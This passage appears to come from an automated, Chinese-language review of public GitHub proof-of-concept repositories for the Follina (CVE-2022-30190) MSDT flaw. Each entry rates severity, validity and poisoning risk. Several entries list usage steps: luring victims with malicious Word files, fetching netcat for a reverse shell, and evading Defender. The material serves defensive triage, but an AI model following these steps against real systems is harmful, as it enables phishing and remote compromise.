总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
